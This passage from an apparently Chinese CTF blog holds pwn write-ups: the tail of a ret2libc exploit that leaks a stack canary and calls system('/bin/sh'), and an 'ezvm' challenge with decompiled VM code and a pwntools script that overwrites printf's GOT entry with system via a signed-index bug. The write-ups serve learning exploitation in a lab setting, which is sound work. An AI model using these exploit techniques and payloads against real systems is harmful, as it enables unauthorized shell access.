class="line">pop_rdi_add=libcbase+pop_rdi_offset</span><br><span class="line">ret=libcbase+ret_offset</span><br><span class="line">sys_add=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_add=libcbase+<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choose your option: \n1. input\n2. repeat\n3. exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(canary)+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+p64(pop_rdi_add)+p64(bin_add)+p64(ret)+p64(sys_add)</span><br><span class="line">r.send(payload2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>基本的栈溢出，有canary保护和NX保护，打ret2libc<br>溢出先覆盖canary的最低字节处的\x00，防止输出被截断，成功泄露canary，下一次溢出就可以绕过canary泄露出栈上的返回地址<br>接下来gdb调试一下得出泄露的返回地址与libc_start_main函数的偏移，就成功泄露libc<br>此处注意在gdb时发现无法直接在main函数处下断点，<strong>现在知道<code>__libc_start_main</code>函数的第一个参数就是main函数地址</strong>，在<code>__libc_start_main</code>处下断点再查看rdi寄存器就可以得到main函数的地址了<br>尤其注意最后加上一个ret片段来完成栈对齐<br>引申：**<code>_start</code>函数调用<code>__libc_start_main</code>函数中的一段，被称为<code>__libc_start_call_main</code>（在调试时可以看到）调用main函数，main函数返回时会返回到<code>__libc_start_main</code>函数的某一偏移处，接着调用exit函数，程序结束**，见<a href="https://r3t2.top/2025/08/30/%E5%85%B3%E4%BA%8Eexit%E7%9A%84%E5%88%A9%E7%94%A8%E4%BB%A5%E5%8F%8A%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%BC%80%E5%A7%8B%E5%88%B0%E7%BB%93%E6%9D%9F/">另一篇博客</a></p><h2 id="ezvm"><a href="#ezvm" class="headerlink" title="ezvm"></a>ezvm</h2><h3 id="复现-vm-got表覆写"><a href="#复现-vm-got表覆写" class="headerlink" title="复现&#x2F;vm&#x2F;got表覆写"></a>复现&#x2F;vm&#x2F;got表覆写</h3><p>这是一道虚拟机题目，一般源码很长，但漏洞点一般就一些，其他选项是迷惑<br>题目的虚拟机实现的源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_12AE</span><span class="params">(__int64 a1, __int64 a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [rsp+26h] [rbp-2Ah]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+27h] [rbp-29h]</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [rsp+29h] [rbp-27h]</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [rsp+2Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> v11; <span class="comment">// [rsp+2Dh] [rbp-23h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v12; <span class="comment">// [rsp+2Eh] [rbp-22h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v13; <span class="comment">// [rsp+2Fh] [rbp-21h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v14; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v15; <span class="comment">// [rsp+31h] [rbp-1Fh]</span></span><br><span class="line">  <span class="type">char</span> v16; <span class="comment">// [rsp+32h] [rbp-1Eh]</span></span><br><span class="line">  <span class="type">char</span> v17; <span class="comment">// [rsp+33h] [rbp-1Dh]</span></span><br><span class="line">  <span class="type">char</span> v18; <span class="comment">// [rsp+34h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> v19; <span class="comment">// [rsp+35h] [rbp-1Bh]</span></span><br><span class="line">  <span class="type">char</span> v20; <span class="comment">// [rsp+36h] [rbp-1Ah]</span></span><br><span class="line">  <span class="type">char</span> v21; <span class="comment">// [rsp+37h] [rbp-19h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v22; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v23; <span class="comment">// [rsp+39h] [rbp-17h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v24; <span class="comment">// [rsp+3Ah] [rbp-16h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v25; <span class="comment">// [rsp+3Bh] [rbp-15h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+3Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v25 = *(_BYTE *)(i + a2);</span><br><span class="line">    <span class="keyword">switch</span> ( v25 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        sub_11E6(a1, *(<span class="type">unsigned</span> __int8 *)(++i + a2));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        sub_1254(a1);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        v7 = sub_1254(a1);</span><br><span class="line">        v6 = sub_1254(a1);</span><br><span class="line">        sub_11E6(a1, (<span class="type">unsigned</span> __int8)(v7 + v6));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        v9 = sub_1254(a1);</span><br><span class="line">        v8 = sub_1254(a1);</span><br><span class="line">        sub_11E6(a1, (<span class="type">unsigned</span> __int8)(v9 - v8));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        v3 = *(<span class="type">char</span> *)(++i + a2);</span><br><span class="line">        *(_BYTE *)(a1 + v3) = sub_1254(a1);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">        sub_11E6(a1, *(<span class="type">unsigned</span> __int8 *)(a1 + *(<span class="type">char</span> *)(++i + a2)));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) &lt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Stack underflow!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ++*(_BYTE *)(a1 + *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) + <span class="number">128</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) &lt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Stack underflow!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        --*(_BYTE *)(a1 + *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) + <span class="number">128</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">9u</span>:</span><br><span class="line">        v11 = sub_1254(a1);</span><br><span class="line">        v10 = sub_1254(a1);</span><br><span class="line">        sub_11E6(a1, (<span class="type">unsigned</span> __int8)(v10 * v11));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xAu</span>:</span><br><span class="line">        v13 = sub_1254(a1);</span><br><span class="line">        v12 = sub_1254(a1);</span><br><span class="line">        <span class="keyword">if</span> ( !v12 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Division by zero!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        sub_11E6(a1, (<span class="type">unsigned</span> __int8)(v13 / v12));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xBu</span>:</span><br><span class="line">        v15 = sub_1254(a1);</span><br><span class="line">        v14 = sub_1254(a1);</span><br><span class="line">        <span class="keyword">if</span> ( !v14 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Division by zero!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        sub_11E6(a1, (<span class="type">unsigned</span> __int8)(v15 % v14));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xCu</span>:</span><br><span class="line">        v17 = sub_1254(a1);</span><br><span class="line">        v16 = sub_1254(a1);</span><br><span class="line">        sub_11E6(a1, (<span class="type">unsigned</span> __int8)(v16 &amp; v17));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xDu</span>:</span><br><span class="line">        v19 = sub_1254(a1);</span><br><span class="line">        v18 = sub_1254(a1);</span><br><span class="line">        sub_11E6(a1, (<span class="type">unsigned</span> __int8)(v18 | v19));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xEu</span>:</span><br><span class="line">        v21 = sub_1254(a1);</span><br><span class="line">        v20 = sub_1254(a1);</span><br><span class="line">        sub_11E6(a1, (<span class="type">unsigned</span> __int8)(v20 ^ v21));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xFu</span>:</span><br><span class="line">        <span class="keyword">if</span> ( *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) &lt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Stack underflow!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_BYTE *)(a1 + *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) + <span class="number">128</span>) = ~*(_BYTE *)(a1 + *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) + <span class="number">128</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x10u</span>:</span><br><span class="line">        v22 = *(_BYTE *)(i + <span class="number">1</span> + a2);</span><br><span class="line">        <span class="keyword">if</span> ( a3 &lt;= v22 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Jump out of bounds!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        i = v22 - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x11u</span>:</span><br><span class="line">        v23 = *(_BYTE *)(++i + a2);</span><br><span class="line">        <span class="keyword">if</span> ( a3 &lt;= v23 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Jump out of bounds!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) &gt;= <span class="number">0</span> &amp;&amp; !*(_BYTE *)(a1 + *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) + <span class="number">128</span>) )</span><br><span class="line">          i = v23 - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x12u</span>:</span><br><span class="line">        v24 = *(_BYTE *)(++i + a2);</span><br><span class="line">        <span class="keyword">if</span> ( a3 &lt;= v24 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Jump out of bounds!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) &gt;= <span class="number">0</span> &amp;&amp; *(_BYTE *)(a1 + *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) + <span class="number">128</span>) )</span><br><span class="line">          i = v24 - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Unknown opcode: 0x%02X\n&quot;</span>, v25);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过逆向，主要有用的命令码有：0x01将下一个字节压栈；0x03：加法（弹出栈顶两元素相加后压栈）；0x04：减法（弹出栈顶元素减次栈顶元素后压栈）；0x05：将栈顶值存到下一字节索引处<br>选项0x05中的索引值类型为char，如果我们写入0x80，即128超出char的上限，0x80&#x3D;0b10000000，符号位是1被认定为负数的补码，还原后会得到-128，即-0x80，这时我们在ida里发现索引到-128处正好是printf的got表项，那么我们根据偏移关系（libc.sym[“system”]和libc.sym[“printf”]比对），就可以把printf的got表项改为system，最后把”sh”写入（一般写&#x2F;bin&#x2F;sh，这里图省事），便可以getshell。<br>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">log.success(<span class="built_in">hex</span>(libc.sym[<span class="string">&quot;system&quot;</span>]-libc.sym[<span class="string">&quot;printf&quot;</span>]))</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;125.220.147.47&#x27;</span>,<span class="number">49761</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;\x01&quot;</span>+p8(<span class="number">0x70</span>)+<span class="string">b&quot;\x05&quot;</span>+p8(<span class="number">0x80</span>)</span><br><span class="line">payload+=<span class="string">b&quot;\x01\x07\x06\x81\x03&quot;</span>+<span class="string">b&quot;\x05&quot;</span>+p8(<span class="number">0x81</span>)</span><br><span class="line">payload+=<span class="string">b&quot;\x01\x01\x06\x82\x04&quot;</span>+<span class="string">b&quot;\x05&quot;</span>+p8(<span class="number">0x82</span>)</span><br><span class="line">payload+=<span class="string">b&quot;\x01s&quot;</span>+ <span class="string">b&quot;\x05&quot;</span>+p8(<span class="number">0x0</span>)+ <span class="string">b&quot;\x01h&quot;</span>+ <span class="string">b&quot;\x05&quot;</span>+p8(<span class="number">0x1</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;input length: &quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(payload)).encode())</span><br><span class="line">r.sendafter(<span class="string">b&quot;input code: &quot;</span>, payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> stack </category>
          
          <category> vm </category>
          
          <category> ret2libc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复盘 </tag>
            
            <tag> 复现 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
